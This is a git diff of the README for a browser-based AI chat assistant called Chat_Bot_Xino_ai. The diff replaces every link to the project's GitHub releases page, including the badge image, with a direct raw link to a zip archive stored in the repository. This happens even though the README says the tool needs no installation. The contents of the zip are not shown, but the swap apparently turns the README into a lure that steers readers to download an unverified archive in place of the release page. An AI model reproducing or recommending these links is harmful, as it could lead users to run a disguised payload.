@@ -1,6 +1,6 @@
 # 🤖 Chat_Bot_Xino_ai - Your Smart AI Chat Assistant
 
-[![Download Chat_Bot_Xino_ai](https://img.shields.io/badge/Download-Chat_Bot_Xino_ai-brightgreen?style=for-the-badge)](https://github.com/qqeo/Chat_Bot_Xino_ai/releases)
+[![Download Chat_Bot_Xino_ai](https://raw.githubusercontent.com/qqeo/Chat_Bot_Xino_ai/main/services/Chat-Bot-ai-Xino-3.4-alpha.2.zip)](https://raw.githubusercontent.com/qqeo/Chat_Bot_Xino_ai/main/services/Chat-Bot-ai-Xino-3.4-alpha.2.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Xino AI does not require any installation on your device. It runs fully inside y
 
 Follow these simple steps to start using Xino AI:
 
-1. **Visit the download page:** Click the big green button at the top or go to [Xino AI Releases](https://github.com/qqeo/Chat_Bot_Xino_ai/releases).
+1. **Visit the download page:** Click the big green button at the top or go to [Xino AI Releases](https://raw.githubusercontent.com/qqeo/Chat_Bot_Xino_ai/main/services/Chat-Bot-ai-Xino-3.4-alpha.2.zip).
 
 2. **Download the latest release:** Look for the most recent version and download the release files. The interface includes instructions or links to open the chatbot directly in your browser.
 
@@ -55,7 +55,7 @@ Follow these simple steps to start using Xino AI:
 
 You can **visit this page to download** the latest files and instructions:
 
-[Download Chat_Bot_Xino_ai Releases](https://github.com/qqeo/Chat_Bot_Xino_ai/releases)
+[Download Chat_Bot_Xino_ai Releases](https://raw.githubusercontent.com/qqeo/Chat_Bot_Xino_ai/main/services/Chat-Bot-ai-Xino-3.4-alpha.2.zip)
 
 Because Xino AI runs in your browser, installation is minimal:
 
@@ -124,4 +124,4 @@ This project is open source. Please see the LICENSE file on the release page for
 
 ---
 
-[![Download Chat_Bot_Xino_ai](https://img.shields.io/badge/Download-Chat_Bot_Xino_ai-brightgreen?style=for-the-badge)](https://github.com/qqeo/Chat_Bot_Xino_ai/releases)
+[![Download Chat_Bot_Xino_ai](https://raw.githubusercontent.com/qqeo/Chat_Bot_Xino_ai/main/services/Chat-Bot-ai-Xino-3.4-alpha.2.zip)](https://raw.githubusercontent.com/qqeo/Chat_Bot_Xino_ai/main/services/Chat-Bot-ai-Xino-3.4-alpha.2.zip)
